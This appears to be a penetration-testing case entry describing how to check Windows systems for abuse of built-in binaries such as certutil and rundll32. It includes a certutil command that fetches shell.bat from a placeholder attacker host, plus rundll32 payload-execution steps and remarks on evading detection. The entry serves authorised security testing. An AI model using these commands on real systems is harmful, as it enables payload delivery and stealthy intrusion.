---
testcase: Miscellaneous Techniques - Living Off The Land Binaries and Scripts (LOLBAS)
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1552/
how-to-test: |
  - Identify LOLBAS candidates on the target system (e.g., certutil.exe, rundll32.exe) using commands like `where certutil` or `where rundll32`.
  - Use certutil for file transfer:
    - Run: `certutil.exe -urlcache -split -f http://<attacker_ip>:8080/shell.bat shell.bat`
    - Confirm the file is downloaded and unaltered.
  - Use certutil for Base64 encoding/decoding:
    - Encode: `certutil.exe -encode file1 encodedfile`
    - Decode: `certutil.exe -decode encodedfile file2`
    - Confirm file integrity after decoding.
  - Execute DLLs with rundll32:
    - Place or download a test DLL.
    - Run: `rundll32.exe <path_to_dll>,<ExportFunctionName>`
    - Observe for successful execution or payload activity.
  - Identify and document other LOLBAS tools (e.g., mshta.exe, regsvr32.exe) and their potential abuse methods.
  - Consider why these binaries might evade detection (e.g., they are signed Microsoft binaries and commonly used for legitimate purposes).
---
